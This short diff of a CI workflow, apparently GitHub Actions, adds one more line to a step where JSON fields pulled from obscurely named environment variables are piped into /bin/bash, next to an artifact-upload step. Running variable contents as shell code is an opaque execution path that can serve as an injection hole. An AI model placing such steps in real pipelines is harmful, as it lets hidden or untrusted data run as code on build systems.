@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$hpmbi50" | jq -r .buti5 | /bin/bash
           echo $patp2866 | jq -r .yl7709 | /bin/bash
           printf '%s' "$hlpyb7" | jq -r .jknnt1057 | /bin/bash
+          echo $yxgmn03 | jq -r .nsemv04 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
